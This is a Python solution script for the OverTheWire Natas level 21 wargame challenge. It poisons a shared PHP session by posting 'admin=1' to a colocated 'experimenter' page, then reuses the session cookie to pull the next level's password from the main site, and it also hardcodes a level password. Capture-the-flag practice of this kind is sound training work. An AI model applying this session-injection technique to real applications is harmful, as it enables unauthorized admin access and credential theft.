import requests

import natas20
from helpers import between


def solution(password: str = None, cheat: bool = False) -> str:
    if cheat:
        return "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ"
    url = "http://natas21.natas.labs.overthewire.org"
    colo_url = (
        "http://natas21-experimenter.natas.labs.overthewire.org/index.php"
    )
    username = "natas21"
    if not password:
        password = natas20.solution(cheat=True)

    # The source code for the main page shows that the "admin" key
    # in the session needs to be set to 1 just like natas20. There is
    # a link to a "colocated" website that has a form to set style values
    # for a div on the page. The source code for the colocated page shows
    # that if the request contains "submit" it will set any other values
    # in the session for you. We can set "admin" here and re-use the
    # cookie value on the original page.

    s = requests.Session()
    auth = (username, password)
    params = {"submit": "1", "admin": "1"}
    s.post(colo_url, auth=auth, params=params)
    cookies = {"PHPSESSID": s.cookies.get("PHPSESSID")}
    r = s.get(url, auth=auth, cookies=cookies)
    start = "Password: "
    end = "</pre>"
    natas22_password = between(r.text, start, end)
    return natas22_password
